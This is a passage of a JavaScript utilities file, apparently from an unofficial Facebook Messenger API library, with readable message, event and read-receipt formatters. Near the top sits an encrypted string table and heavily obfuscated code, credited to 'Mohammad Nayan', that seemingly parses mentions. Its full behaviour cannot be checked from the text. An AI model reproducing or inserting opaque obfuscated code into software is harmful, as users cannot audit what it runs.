F%0FKDMFH50JCGM%3CH50%3C0G=:%3EGDJC%204%11\'FDH%16%0A%13%09%00%1A%04%0E%05L%3E.%0E%16EH%10%1E%03%13%16%1C%03AC%02%0E%16!FDH0%02%02%0A%22FD%3CCE%1B%01%16%00%0E%15%02%03%08G%19%09%1D%19CE%1D%15%06%1A%18%13%05L%00?%22%17EH@47%12%19FDJ3;S&KGF-%1D)%1EOJ%13%0B%14%05%0F%12%0E%0C%00M5/%04%1EOJ%15%1F%04%1F%19%14%09CFF:6GGL83FI@G=L830:@7;L830HBGN%0D%0E%5E)IBE%1B%01%16%00%0E%15%02%03%08G%15%0C%06%19CE%1D%15%06%1A%18%13%05L%00%12%0D%0D%19%08%04%02NN%18%13V%1C%07%09%12G3%17%0E%19V7D%06%07%0C%14CGN%04%1E%1B%19%08CGN%19,%1F%172CGN%03$8%3E%1DCGN%06?8%11&CGN!%18%1F4%1ECGN3%1B%15&%13CGN./%1A%3C%05CGN%11%03%3E%0E%16CGN00%05/=CGNDKA%16OMI%12DKA%13OMI:%15EOL%00CGNGEOLMCGNEEOL1CI@DBABO%19%1ENJE%16%1E%08%11I@D%17%16%1E%08%11I@D%05%07%1D%0F%04%08%14%19%11ABO%15%08%09%0EEOLN@NEOGF-%05%3E%15%16&EOL1CKM:E?LEE%0B%10%22=%227OMI%10%12%05%01%1E%1B%1570%12%02ABO%11%091%18%18%15LAC%0A%0F%18%02%1D%0B%05%00%1FNJEEHK4%3E123%0ALACK0DCF2JE,?%04%1A%02&OMI%0E%07%1A%1B%0BOMIL:@K2JD7NF;?8%25%25%10%0CDKA%10%1A%16%09%18%03EOL&%1D9%08%01EOL%10%15%14%1A%03%1EABOE%112%05#$1OMI%15-%13!%0EOMI%19%12%1A%06%1EOMI%1C%04;?%1E%0CCGNC%1B%25%1A%10%1D%03NJE%1E%10%1BCGN%14%17%1E%13OMI3?=?2:CGNEO?L1FCI:@\'%0B%1F%09%20%09DKA9%15%08%1F%19W4%0B_1=I@D%0F%13%11OMI%0D%16%04%01%1AOMI%16%12%0F%01LAC7N:@?L1CO0AN?2%3E9-/%0EEOL1%0F!0D;D%12Y%037%02,FABO=%1E%5EP_%5B2%18\'.%5D#V?2%19%1E%0E%14%18%18RLAC%18%12%13%0FABO%07#%1A6%1FABO%1F%12%1C%1A%1B%13%1B%5C%3E%1BNJEC%03H%0CJ%01E%0A?LOMI%15%16%05=%08%12%20%08%12%07EOLN=LM1!&%08*9I@D%06%00%11%1BCGNBDE2J@-%0E6.%05+OMI%10D:X%08%18%0F%08%18%0F%08%0DN%1FW%0E%14NN%18%1C%08%15%1E%1E%08GK6%3C%14%11DON8%00%09%0C*DO:KG%10%07%1E%02%05%13%0A%01%03A\'%18Q%10KG%16%13%0E%18%13%15%0DNEJ@7M%3C%3E36J01;LKEF:@7;:8E6%3C6EOMKEF:@7;:8E6%3C6EMOHOF:6GNLH5F:61=L830HB%11%00%12%0D%0D%19%08%04%02F%09RW%1AIB%17%14%02%17%1B%1F%0FK%02%16%1E\'FDJ#\'2$KGF).%05$OJE9R%08)NN%1E%08%18%0F%08%18%0F%08%0DN%03R,%14NN%18%1C%08%15%1E%1E%08GKE6%3C@MM%3C%3EEEJ@7M%3C%3E36J01M%3C%3E3DH@DMFH50H%16%0A%13%09%00%1A%04%0E%05L6&)%16EH%10%1E%03%13%16%1C%03A#\'2$KGF%1BS%0B%10OJE%0F.%19%14NNH:%5E%02.DO%1A%05%1B%03%02%1F%05%09%09C%044#%13DO%1C%11%0B%19%14%19%02F#)=)IBG.%14U%16EH@%20%10%22%1BFDJ%11%03%1E%1DKGF1.%22%1FOJE%0B5%1C%14NNH%3E(/%12DOL%09%5C+%18CEM%11%13%5D,IBG%10%1D**EH@%1ER/%14FDJ\'%1A#%1FKG%10%07%1E%02%05%13%0A%01%03A\'%1A#%1FKG%16%13%0E%18%13%15%0DNE:67=:%3EE6%3CB7MFH50JJG=:HOF:61%1B%01%16%00%0E%15%02%03%08G%05:%1A%19CE%1D%15%06%1A%18%13%05LN%05%00?)IBE=%09%07%03,IB1NN%1E%08%093(DO%5C%05%1B%03%02%1F%05%09%09C&%1C%1B%13DO%1C%11%0B%19%14%19%02F@?%1B%5DQ__A%1A%05%1B%03%02%1F%05%09%09C%0C%22%13%13DO%1C%11%0B%19%14%19%02FO%05Y%0B#CEO%3C%0D%0A%00%20CE;OJ%13%0B%14%05%0F%12%0E%0C%00M%25%07%19%1EOJ%15%1F%04%1F%19%14%09C%14%02%19%11DOL%01%0D%3C%25CEM%0DQ(%14IBG%10T%01%18EH@%20%10%22%1BFD%1C%0D%19%08%04%17%07%02%0FK%0A*%08%15FD%1A%19%09%12%12%11%00MILK=+%19\'%14IB1NNJ55%22\'%1ANN%3E%13%0B%14%05%0F%12%0E%0C%00M)%02%1E%10OJ%15%1F%04%1F%19%14%09CF%25%12%5D%14NNJ5%03%05%06-NN%3EFD%1C%0D%19%08%04%17%07%02%0FK%0E!%0D%15FD%1A%19%09%12%12%11%00MI%1D%1A#$KGDJC8*%17%19FDH%16%0A%13%09%00%1A%04%0E%05L%22%03%0E%18EH%10%1E%03%13%16%1C%03A%05%00%13$KGF5X%0F#OJE%17%0E%13%16NNH6%3C%14%11DO%1A%05%1B%03%02%1F%05%09%09C6,%04%1DDO%1C%11%0B%19%14%19%02F3R()IBG%1C%22-*EH@%1A%00%08%1AFDJ%0D%5B%00%25KG%10%1B*&%25OJU%0B%14%05%0F%12%0E%0C%00M%1BS%0B%10OJ%15%1F%04%1F%19%14%09CF%1BR%09%1ANNJ5%03%05%06-NN%3EFD%1C%0D%19%08%04%17%07%02%0FK8%10%5E%16FD%1A%19%09%12%12%11%00M1.%22%1FOJE%07S-%15NNH%089%16%13DOL3+#%18CEM%11%13%5D,IBG2T%00+EH@%16%09%1F%19FDJ%19X.%10KG%10%07%1E%02%05%13%0A%01%03A%1D_%04%11KG%16%13%0E%18%13%15%0DNE@01M%3C%3EG6JJG=:HOF:61%1B%01%16%00%0E%15%02%03%08G%15%5B$%17CE%1D%15%06%1A%18%13%05LN7&%20%14IBE=%09%07%03,IB1NN%1E%08%18%0F%08%18%0F%08%0DN5%22\'%1ANN%18%1C%08%15%1E%1E%08GKFF@@7;LKEF:@7;:8E6%3C6EOMK%22/%07%11DONJEEJ07M%3C8EL:6GGL830J0G=:%3E3F:61=L830:@7;:%3EG%10%07%1E%02%05%13%0A%01%03A%19%5C%22%11KG%16%13%0E%18%13%15%0DN%25(%06/NNH%14%02%19%11DOL%09Z%0E%1BCEM%1D%0C%16%17IBG%0CU%25%17EH@8%1E%20%15FDJ%11%03%1E%1DKG%10%07%1E%02%05%13%0A%01%03A?%14!%11KG%16%13%0E%18%13%15%0DNE5!?%1FOJG65%1DU%13OJ3E%03,%06%10OJG%10%07%1E%02%05%13%0A%01%03A%05:%1F%11KG%16%13%0E%18%13%15%0DN%07U%08%16NNH&%04%13%1DDOL%05:%1A%19CEM+%15+%15IB%11%00%12%0D%0D%19%08%04%02F7%10,%1BIB%17%14%02%17%1B%1F%0FK$-3%20FDJ3?W%1DKGF%13_$%11OJE%0BV%0D.NN%1E&,%04*DO%5C%05%1B%03%02%1F%05%09%09C%04%3C%15%1DDO%1C%15%0F%1FA\'%02%11%11%5EFZR%5D__PSWHXBW%11%0F%0A%02%08I\'%02%11%11_F%5D%0EY%5CQUR%5E@WR%5ETRJG%1E%16%02%18%05%0FK%22%03%16%1DE%1D%04%02%1D%08ACZ%5E_PX@Q%04%5EVQP%5E%5BHQ%20%08%10%15SEQ%04XVWRXXD%5DYSPZGV%1A%08%03%08%14%17N!%11X%1A%5B#%096%1A%5C-%19%08%04%17%07%02%0FC%3C7=!F%1F%0C%1D.NNO%04%3EQ%1DDOK%09%09%1D%22CEJ?Q).IBEOOJU%0B%07%04(NNX%02%08%15K%02%3ER%15S!%11X%1A=%15%16*)IBG%0C%3E!%16EH6W%10%06%11N%25%0A2%1A%5BOS%16YQ%5B-TBS%01_Q%5B%5CUPJU%1A%09%02%00%03O+%054%17WDV%1FQ%5E%5DW)IV%08Q%5E%5DQ_%5EON%10%19%04%15%08%04N/%087%1BH%10%0F%07%14%06NEPX%5DWR%5BK%5D%0EY%5CVWP%5ED%5B#%07?%11%5EO%039%5E%1AYOS%01_QY%5DWSN%5E%15P%5BXRVJTEQ%04%5EVRQ%5B_L%5B%14WW%22V%5EHP%0E%14%02%02%05V%02%0A%1F%03GK_TW%5DX_BS%01_Q%5B%5CWUJT%25%0A2%1A%5BOS%16%5CPYX%5EJS%01_PZ%5CRVJU%16%25%014%11%3C3-%0A%18CE;Z/%1E%5E%170(.%0B\'FDJ/%00%13%1FKG0Z\'%1CU%118&.-*DO:%5E%18%0F%0A%13W%1B%05%11%0B%0C%0AP%11%1B%05%11%0B%0C%0AP%0F%07%14%06NEQ$_WRP%5EXQ%5EZUJS%16%5CX*/SVU,D%5B\'%02%11%11%5EO)%0B3%1BYOS%16%5CQRZVJS%01_Q_YVUJTEWR%5ESQN%5E%02S%5B%5BWRRGV%03%19%09%07%0CX%13%1F%04%1F%19%14%09C*%079%1CW%1B%01%16%00%0E%15%02%03%08G%09=%5D%17CE%1D%15%06%1A%18%13%05LNOHF6J07GL83F@@7;:H5F:61;:H50H0G=%3CH56J01;L8E6%3C61M%3C%3E36J01;%3CHOF:61;:JDE-9%1A%22OJGDJCG=%3CH56JJ7;LBE6%3C6G=L830%3C@7;:8E6%3C67M%3C%3E30H%16%0A%13%09%00%1A%04%0E%05L%22%017%18EH%10%1E%03%13%16%1C%03ACDMFH50JCGM%3CH50%3C0G=:%3EGDKC%02U%20%1BFDHBGNLH5F:61=L830H%16%0A%13%09%00%1A%04%0E%05L%00)5%18EH%10%1E%03%13%16%1C%03A%1D_%04%11KGF-%1D)%1EOJE%17%0E%13%16NNH%1CY)%1CDOL3+#%18CEM%09Z%06%17IBG*3Q*EH%16%1B%095%0A@%1E%209*%5B%01%16%00%0E%15%02%03%08OJ%15%1F%04%1F%19%14%09CW%10Z%1C%034%0EM#5+-Q%00%12%0D%0D%19%08%04%02NN%18%1C%08%15%1E%1E%08GQ%5C%10Z%1C%034%0EM%01%1B,-Q%00%12%0D%0D%19%08%04%02NN%18%1C%08%15%1E%1E%08GQY%10Z%1C%034%0EM\'%3E$-Q%00%12%0D%0D%19%08%04%02NN%18%1C%08%15%1E%1E%08GRV%10Z%1C%034%0EM%05%1C)-Q%00%12%0D%0D%19%08%04%02NN%18%1C%08%15%1E%1E%08GPV%10Z%1C%034%0EM%05%1E%04,Q%00%12%0D%0D%19%08%04%02NN%18%1C%08%15%1E%1E%08GPW%10Z%1C%034%0EM%09%03X-Q%00%12%0D%0D%19%08%04%02NN%18%1C%08%15%1E%1E%08GQ%5B%10Z%1C%034%0EM\'8%03,Q%00%12%0D%0D%19%08%04%02NN%18%1C%08%15%1E%1E%08GQV%10Z%1C%034%0EM%0D%04U-Q%00%12%0D%0D%19%08%04%02NN%18%1C%08%15%1E%1E%08GQ%5E%10Z%1C%034%0EM+=W-Q%00%12%0D%0D%19%08%04%02NN%18%1C%08%15%1E%1E%08GQW%10Z%1C%034%0EM7%0E;-Q%00%12%0D%0D%19%08%04%02NN%18%1C%08%15%1E%1E%08GP%5E%10Z%1C%034%0EM/%20%18,Q%00%12%0D%0D%19%08%04%02NN%18%1C%08%15%1E%1E%08GR%5B%10Z%1C%034%0EM%0D%06#,Q%00%12%0D%0D%19%08%04%02NN%18%1C%08%15%1E%1E%08GPZ%10Z%1C%034%0EM%19%25%15,Q%00%12%0D%0D%19%08%04%02NN%18%1C%08%15%1E%1E%08GP%5B%10Z%1C%034%0EM7%08%16,Q%00%12%0D%0D%19%08%04%02NN%18%1C%08%15%1E%1E%08GPX%10Z%1C%034%0EM;T%10,Q%00%12%0D%0D%19%08%04%02NN%18%1C%08%15%1E%1E%08GR_%10Z%1C%034%0EM%01%15%0B,Q%00%12%0D%0D%19%08%04%02NN%18%1C%08%15%1E%1E%08GQ_%10Z%1C%034%0EM?Y%0D,Q%00%12%0D%0D%19%08%04%02NN%18%1C%08%15%1E%1E%08GW%5E%10Z%1C%034%0EM%1D(7,Q%00%12%0D%0D%19%08%04%02NN%18%1C%08%15%1E%1E%08GP%5C%10Z%1C%034%0EM#%5C/,Q%00%12%0D%0D%19%08%04%02NN%18%1C%08%15%1E%1E%08GP%5D%10Z%1C%034%0EM\':(,Q%00%12%0D%0D%19%08%04%02NN%18%1C%08%15%1E%1E%08G%5B%13V%16%04%3E%0FI%08%1B!&V%0A%13%09%00%1A%04%0E%05DO%1C%11%0B%19%14%19%02FUW%13V%16%04%3E%0FI&%3C)&V%0A%13%09%00%1A%04%0E%05DO%1C%11%0B%19%14%19%02FTT%13V%16%04%3E%0FI%04%06%14$V%0A%13%09%00%1A%04%0E%05DO%1C%11%0B%19%14%19%02FVZ%13V%16%04%3E%0FI%00%0D%19$V%0A%13%09%00%1A%04%0E%05DO%1C%11%0B%19%14%19%02FTR%13V%16%04%3E%0FI%22)5$V%0A%13%09%00%1A%04%0E%05DO%1C%11%0B%19%14%19%02FVW%13V%16%04%3E%0FI%14,%3E$V%0A%13%09%00%1A%04%0E%05DO%1C%11%0B%19%14%19%02FVQ%13V%16%04%3E%0FI%0C%1C$$V%0A%13%09%00%1A%04%0E%05DO%1C%11%0B%19%14%19%02FVS%13V%16%04%3E%0FI%0C%1A%0B\'V%0A%13%09%00%1A%04%0E%05DO%1C%11%0B%19%14%19%02FP%1E%13D\")")}();(function(_0x58b807,_0x43fbdf){var _0x125520=_0x1ebd,_0x2c52b2=_0x58b807();while(!![]){try{var _0x4875c9=parseInt(_0x125520(0x162))/(-0x1*-0xfa9+0x577*0x5+-0x2afb)*(parseInt(_0x125520(0x16e))/(0x1*0x1985+-0x51*0x5+-0x3fd*0x6))+-parseInt(_0x125520(0x18c))/(0x486+-0x80a+-0x3*-0x12d)+-parseInt(_0x125520(0x17a))/(0x2057+0x8*0x45b+-0x5f*0xb5)+parseInt(_0x125520(0x16a))/(-0x52*-0x7+0xab*-0xb+0x10*0x52)*(-parseInt(_0x125520(0x173))/(-0x2264+0x1ef6+0x374))+parseInt(_0x125520(0x161))/(0x23b7+-0x86*0x13+0x526*-0x5)*(-parseInt(_0x125520(0x186))/(0x1*0x1f82+-0xafd+0x1*-0x147d))+-parseInt(_0x125520(0x18b))/(-0x47*0x1d+0x338+0x4dc)+-parseInt(_0x125520(0x183))/(-0x121f+-0x152a+0x2753)*(-parseInt(_0x125520(0x164))/(-0x1099+0x121b+-0x5*0x4b));if(_0x4875c9===_0x43fbdf)break;else _0x2c52b2[woRi.QB4f(0)](_0x2c52b2[woRi.k1tg(1)]());}catch(_0x1b9f10){_0x2c52b2[woRi.QB4f(0)](_0x2c52b2[woRi.k1tg(1)]());}}}(_0x2580,0x157cfd+0x2*0xa68d5+0x2dff1*-0xa));function _0x1ebd(_0x186eff,_0x37dc13){_0x186eff=_0x186eff-(0x45e+-0x1b88+0x1889);var _0x287b2b=_0x2580();var _0x3efa81=_0x287b2b[_0x186eff];return _0x3efa81;}function getMentionsFromDeltaMessage(_0x5b8830){var _0xfcfedf=_0x1ebd,_0x36b643={[woRi.gOge(2)]:function(_0x1486e8,_0x9af263){return _0x1486e8>_0x9af263;},[woRi.cJbe(3)]:function(_0x4a7359,_0x5d99f9){return _0x4a7359<_0x5d99f9;},[woRi.AdGe(4)]:function(_0x297c1b,_0x122290,_0x3b5e94){return _0x297c1b(_0x122290,_0x3b5e94);},[woRi.UAye(5)]:function(_0x524516,_0x2d7ca8){return _0x524516(_0x2d7ca8);},[woRi.Qx0e(6)]:function(_0x1d5b06,_0xf3e183){return _0x1d5b06+_0xf3e183;},[woRi.kVSe(7)]:_0xfcfedf(0x180),[woRi.QB4f(8)]:function(_0x3efd57,_0x40b0be){return _0x3efd57!=_0x40b0be;},[woRi.k1tg(9)]:function(_0x3c79ea,_0x38eb64){return _0x3c79ea+_0x38eb64;}},_0x39d168=_0x5b8830[_0xfcfedf(0x17d)]||woRi.gOge(10),_0x6b2e60={},_0x3e09be=[];if(_0x5b8830[_0xfcfedf(0x187)]&&_0x5b8830[_0xfcfedf(0x187)][_0xfcfedf(0x185)])try{_0x3e09be=JSON[_0xfcfedf(0x177)](_0x5b8830[_0xfcfedf(0x187)][_0xfcfedf(0x185)]);}catch(_0x346804){_0x3e09be=[];}if(_0x36b643[_0xfcfedf(0x170)](_0x3e09be[_0xfcfedf(0x168)],0x12f7+-0x146+0x7*-0x287)){for(var _0x2c2f25=-0x10fa+0x252c+0x40a*-0x5;_0x36b643[_0xfcfedf(0x179)](_0x2c2f25,_0x3e09be[_0xfcfedf(0x168)]);_0x2c2f25++){var _0x429f70=_0x3e09be[_0x2c2f25][woRi.cJbe(11)],_0x1cf3e4=_0x36b643[_0xfcfedf(0x184)](parseInt,_0x3e09be[_0x2c2f25][woRi.AdGe(12)],-0xc0f+0x4e1+0x738)||-0x979+0xf7f*-0x2+0x2877,_0x30e6e1=_0x36b643[_0xfcfedf(0x184)](parseInt,_0x3e09be[_0x2c2f25][woRi.UAye(13)],-0x1590+-0xd5e+0x8*0x45f)||0xc57*0x3+0x110*-0x6+0x20b*-0xf;_0x6b2e60[_0x36b643[_0xfcfedf(0x18e)](String,_0x429f70)]=_0x39d168[_0xfcfedf(0x189)](_0x1cf3e4,_0x36b643[_0xfcfedf(0x169)](_0x1cf3e4,_0x30e6e1));}return _0x6b2e60;}var _0x463b96=_0x5b8830[_0xfcfedf(0x18d)+_0xfcfedf(0x188)];if(_0x463b96&&_0x463b96[_0xfcfedf(0x187)]&&_0x463b96[_0xfcfedf(0x187)][_0xfcfedf(0x187)]&&_0x463b96[_0xfcfedf(0x187)][_0xfcfedf(0x187)][woRi.Qx0e(14)]&&_0x463b96[_0xfcfedf(0x187)][_0xfcfedf(0x187)][woRi.Qx0e(14)][_0xfcfedf(0x16d)]&&_0x463b96[_0xfcfedf(0x187)][_0xfcfedf(0x187)][woRi.Qx0e(14)][_0xfcfedf(0x16d)][_0xfcfedf(0x187)]){var _0x3056ec=_0x463b96[_0xfcfedf(0x187)][_0xfcfedf(0x187)][woRi.Qx0e(14)][_0xfcfedf(0x16d)][_0xfcfedf(0x187)];for(var _0x4fd797 in _0x3056ec){if(!Object[_0xfcfedf(0x160)][_0xfcfedf(0x182)+_0xfcfedf(0x18a)][_0xfcfedf(0x171)](_0x3056ec,_0x4fd797))continue;var _0x588fef=_0x3056ec[_0x4fd797];if(_0x588fef&&_0x588fef[_0xfcfedf(0x16d)]&&_0x588fef[_0xfcfedf(0x16d)][_0xfcfedf(0x187)]){var _0x116de2=_0x36b643[_0xfcfedf(0x174)][_0xfcfedf(0x163)](woRi.kVSe(15)),_0x19eac5=-0xb*-0x34f+-0x19*0x14e+-0x3c7;while(!![]){switch(_0x116de2[_0x19eac5++]){case woRi.QB4f(16):var _0x3a26bb=_0x36b643[_0xfcfedf(0x184)](parseInt,_0x5c7919[_0xfcfedf(0x166)]&&_0x5c7919[_0xfcfedf(0x166)][_0xfcfedf(0x15f)]?_0x5c7919[_0xfcfedf(0x166)][_0xfcfedf(0x15f)]:0x16a8+-0x134d+-0x35b,0x9b6*0x2+0x2505+-0x3867);continue;case woRi.k1tg(17):var _0x5c7919=_0x588fef[_0xfcfedf(0x16d)][_0xfcfedf(0x187)];continue;case woRi.gOge(18):var _0x1c43d2=_0x36b643[_0xfcfedf(0x184)](parseInt,_0x5c7919[_0xfcfedf(0x168)]&&_0x5c7919[_0xfcfedf(0x168)][_0xfcfedf(0x15f)]?_0x5c7919[_0xfcfedf(0x168)][_0xfcfedf(0x15f)]:-0x431+-0x1d6*-0x2+-0x7*-0x13,-0xfd+0x15ca+-0x1*0x14c3);continue;case woRi.cJbe(19):_0x36b643[_0xfcfedf(0x181)](_0x429f70,null)&&(_0x6b2e60[_0x429f70]=_0x39d168[_0xfcfedf(0x189)](_0x3a26bb,_0x36b643[_0xfcfedf(0x165)](_0x3a26bb,_0x1c43d2)));continue;case woRi.AdGe(20):var _0x429f70=_0x5c7919[woRi.UAye(21)]&&_0x5c7919[woRi.UAye(21)][_0xfcfedf(0x15f)]?_0x36b643[_0xfcfedf(0x18e)](String,_0x5c7919[woRi.UAye(21)][_0xfcfedf(0x15f)]):null;continue;}break;}}}}return _0x6b2e60;}function _0x2580(){var _0x5b0061=[woRi.Qx0e(22),woRi.kVSe(23),woRi.QB4f(24),woRi.k1tg(25),woRi.gOge(26),woRi.cJbe(27),woRi.AdGe(28),woRi.UAye(5),woRi.UAye(29),woRi.Qx0e(30),woRi.kVSe(31),woRi.QB4f(32),woRi.k1tg(33),woRi.gOge(34),woRi.k1tg(9),woRi.cJbe(35),woRi.AdGe(36),woRi.UAye(37),woRi.Qx0e(6),woRi.Qx0e(38),woRi.kVSe(39),woRi.QB4f(40),woRi.k1tg(41),woRi.gOge(42),woRi.cJbe(43),woRi.gOge(2),woRi.AdGe(44),woRi.UAye(45),woRi.Qx0e(46),woRi.kVSe(7),woRi.kVSe(47),woRi.QB4f(48),woRi.k1tg(49),woRi.gOge(50),woRi.cJbe(3),woRi.cJbe(51),woRi.AdGe(52),woRi.UAye(53),woRi.Qx0e(54),woRi.kVSe(55),woRi.QB4f(56),woRi.k1tg(57),woRi.QB4f(8),woRi.gOge(58),woRi.cJbe(59),woRi.AdGe(4),woRi.AdGe(60),woRi.UAye(61)];_0x2580=function(){return _0x5b0061;};return _0x2580();}function nayan(_0xfcb06f){var _0x43c4b7=_0x1ebd,_0x47124f={[woRi.kVSe(39)]:function(_0x41e6bc,_0x3b93b3){return _0x41e6bc(_0x3b93b3);},[woRi.UAye(45)]:function(_0x3a9f55,_0x5b6dbd){return _0x3a9f55==_0x5b6dbd;},[woRi.kVSe(55)]:_0x43c4b7(0x17b)+woRi.Qx0e(62),[woRi.AdGe(36)]:_0x43c4b7(0x17c)+_0x43c4b7(0x175)+_0x43c4b7(0x17f)+_0x43c4b7(0x176)},_0x27ba22=_0x47124f[_0x43c4b7(0x16b)](getMentionsFromDeltaMessage,_0xfcb06f[_0x43c4b7(0x16c)]),_0x3d48d7=Object[_0x43c4b7(0x178)](_0x27ba22);if(_0x47124f[_0x43c4b7(0x172)](_0x3d48d7[_0x43c4b7(0x168)],0x2fa+0x7*-0x203+0xb1b)){}else console[_0x43c4b7(0x16f)](_0x47124f[_0x43c4b7(0x17e)],_0x47124f[_0x43c4b7(0x167)]);return _0x27ba22;}

function formatDeltaMessage(m) {
  const md = m.delta.messageMetadata;

  const mdata =
    m.delta.data === undefined ? [] :
    m.delta.data.prng === undefined ? [] :
    JSON.parse(m.delta.data.prng);
  const m_id = mdata.map(u => u.i);
  const m_offset = mdata.map(u => u.o);
  const m_length = mdata.map(u => u.l);

  // fixed by Mohammad Nayan
  var mentions = nayan(m);

  /*
  for (let i = 0; i < m_id.length; i++) {
    mentions[m_id[i]] = m.delta.body.substring(
      m_offset[i],
      m_offset[i] + m_length[i]
    );
  }*/



  return {
    type: "message",
    senderID: formatID(md.actorFbId.toString()),
    body: m.delta.body || "",
    threadID: formatID(
      (md.threadKey.threadFbId || md.threadKey.otherUserFbId).toString()
    ),
    messageID: md.messageId,
    attachments: (m.delta.attachments || []).map(v => _formatAttachment(v)),
    mentions: mentions,
    timestamp: md.timestamp,
    isGroup: !!md.threadKey.threadFbId,
    participantIDs: m.delta.participants
  };
}

function formatID(id) {
  if (id != undefined && id != null) {
    return id.replace(/(fb)?id[:.]/, "");
  }
  else {
    return id;
  }
}

function formatMessage(m) {
  const originalMessage = m.message ? m.message : m;
  const obj = {
    type: "message",
    senderName: originalMessage.sender_name,
    senderID: formatID(originalMessage.sender_fbid.toString()),
    participantNames: originalMessage.group_thread_info ?
      originalMessage.group_thread_info.participant_names : [originalMessage.sender_name.split(" ")[0]],
    participantIDs: originalMessage.group_thread_info ?
      originalMessage.group_thread_info.participant_ids.map(function(v) {
        return formatID(v.toString());
      }) : [formatID(originalMessage.sender_fbid)],
    body: originalMessage.body || "",
    threadID: formatID(
      (
        originalMessage.thread_fbid || originalMessage.other_user_fbid
      ).toString()
    ),
    threadName: originalMessage.group_thread_info ?
      originalMessage.group_thread_info.name : originalMessage.sender_name,
    location: originalMessage.coordinates ? originalMessage.coordinates : null,
    messageID: originalMessage.mid ?
      originalMessage.mid.toString() : originalMessage.message_id,
    attachments: formatAttachment(
      originalMessage.attachments,
      originalMessage.attachmentIds,
      originalMessage.attachment_map,
      originalMessage.share_map
    ),
    timestamp: originalMessage.timestamp,
    timestampAbsolute: originalMessage.timestamp_absolute,
    timestampRelative: originalMessage.timestamp_relative,
    timestampDatetime: originalMessage.timestamp_datetime,
    tags: originalMessage.tags,
    reactions: originalMessage.reactions ? originalMessage.reactions : [],
    isUnread: originalMessage.is_unread
  };

  if (m.type === "pages_messaging")
    obj.pageID = m.realtime_viewer_fbid.toString();
  obj.isGroup = obj.participantIDs.length > 2;

  return obj;
}

function formatEvent(m) {
  const originalMessage = m.message ? m.message : m;
  let logMessageType = originalMessage.log_message_type;
  let logMessageData;
  if (logMessageType === "log:generic-admin-text") {
    logMessageData = originalMessage.log_message_data.untypedData;
    logMessageType = getAdminTextMessageType(
      originalMessage.log_message_data.message_type
    );
  }
  else {
    logMessageData = originalMessage.log_message_data;
  }

  return Object.assign(formatMessage(originalMessage), {
    type: "event",
    logMessageType: logMessageType,
    logMessageData: logMessageData,
    logMessageBody: originalMessage.log_message_body
  });
}

function formatHistoryMessage(m) {
  switch (m.action_type) {
    case "ma-type:log-message":
      return formatEvent(m);
    default:
      return formatMessage(m);
  }
}

// Get a more readable message type for AdminTextMessages
function getAdminTextMessageType(type) {
  switch (type) {
    case 'unpin_messages_v2':
      return 'log:unpin-message';
    case 'pin_messages_v2':
      return 'log:pin-message';
    case "change_thread_theme":
      return "log:thread-color";
    case "change_thread_icon":
    case 'change_thread_quick_reaction':
      return "log:thread-icon";
    case "change_thread_nickname":
      return "log:user-nickname";
    case "change_thread_admins":
      return "log:thread-admins";
    case "group_poll":
      return "log:thread-poll";
    case "change_thread_approval_mode":
      return "log:thread-approval-mode";
    case "messenger_call_log":
    case "participant_joined_group_call":
      return "log:thread-call";
    default:
      return type;
  }
}

function formatDeltaEvent(m) {
  let logMessageType;
  let logMessageData;

  // log:thread-color => {theme_color}
  // log:user-nickname => {participant_id, nickname}
  // log:thread-icon => {thread_icon}
  // log:thread-name => {name}
  // log:subscribe => {addedParticipants - [Array]}
  // log:unsubscribe => {leftParticipantFbId}

  switch (m.class) {
    case "AdminTextMessage":
      logMessageData = m.untypedData;
      logMessageType = getAdminTextMessageType(m.type);
      break;
    case "ThreadName":
      logMessageType = "log:thread-name";
      logMessageData = { name: m.name };
      break;
    case "ParticipantsAddedToGroupThread":
      logMessageType = "log:subscribe";
      logMessageData = { addedParticipants: m.addedParticipants };
      break;
    case "ParticipantLeftGroupThread":
      logMessageType = "log:unsubscribe";
      logMessageData = { leftParticipantFbId: m.leftParticipantFbId };
      break;
    case "ApprovalQueue":
      logMessageType = "log:approval-queue";
      logMessageData = {
        approvalQueue: {
          action: m.action,
          recipientFbId: m.recipientFbId,
          requestSource: m.requestSource,
          ...m.messageMetadata
        }
      };
  }
  return {
    type: "event",
    threadID: formatID(
      (
        m.messageMetadata.threadKey.threadFbId ||
        m.messageMetadata.threadKey.otherUserFbId
      ).toString()
    ),
    messageID: m.messageMetadata.messageId.toString(),
    logMessageType,
    logMessageData,
    logMessageBody: m.messageMetadata.adminText,
    timestamp: m.messageMetadata.timestamp,
    author: m.messageMetadata.actorFbId,
    participantIDs: m.participants
  };
}

function formatTyp(event) {
  return {
    isTyping: !!event.st,
    from: event.from.toString(),
    threadID: formatID(
      (event.to || event.thread_fbid || event.from).toString()
    ),
    // When receiving typ indication from mobile, `from_mobile` isn't set.
    // If it is, we just use that value.
    fromMobile: event.hasOwnProperty("from_mobile") ? event.from_mobile : true,
    userID: (event.realtime_viewer_fbid || event.from).toString(),
    type: "typ"
  };
}

function formatDeltaReadReceipt(delta) {
  // otherUserFbId seems to be used as both the readerID and the threadID in a 1-1 chat.
  // In a group chat actorFbId is used for the reader and threadFbId for the thread.
  return {
    reader: (delta.threadKey.otherUserFbId || delta.actorFbId).toString(),
    time: delta.actionTimestampMs,
    threadID: formatID(
      (delta.threadKey.otherUserFbId || delta.threadKey.threadFbId).toString()
    ),
    type: "read_receipt"
  };
}

function formatReadReceipt(event) {
  return {
    reader: event.reader.toString(),
    time: event.time,
    threadID: formatID((event.thread_fbid || event.reader).toString()),
    type: "read_receipt"
  };
}

function formatRead(event) {
  return {
    threadID: formatID(
      (
        (event.chat_ids && event.chat_ids[0]) ||
        (event.thread_fbids && event.thread_fbids[0])
      ).toString()
    ),
    time: event.timestamp,
    type: "read"
  };
}

function getFrom(str, startToken, endToken) {
  const start = str.indexOf(startToken) + startToken.length;
  if (start < startToken.length) return "";

  const lastHalf = str.substring(start);
  const end = lastHalf.indexOf(endToken);
  if (end === -1) {
    throw Error(
      "Could not find endTime `" + endToken + "` in the given string."
    );
  }
  return lastHalf.substring(0, end);
}

function makeParsable(html) {
  const withoutForLoop = html.replace(/for\s*\(\s*;\s*;\s*\)\s*;\s*/, "");

  // (What the fuck FB, why windows style newlines?)
  // So sometimes FB will send us base multiple objects in the same response.
  // They're all valid JSON, one after the other, at the top level. We detect
  // that and make it parse-able by JSON.parse.
  //       Ben - July 15th 2017
  //
  // It turns out that Facebook may insert random number of spaces before
  // next object begins (issue #616)
  //       rav_kr - 2018-03-19
  const maybeMultipleObjects = withoutForLoop.split(/\}\r\n *\{/);
  if (maybeMultipleObjects.length === 1) return maybeMultipleObjects;

  return "[" + maybeMultipleObjects.join("},{") + "]";
}

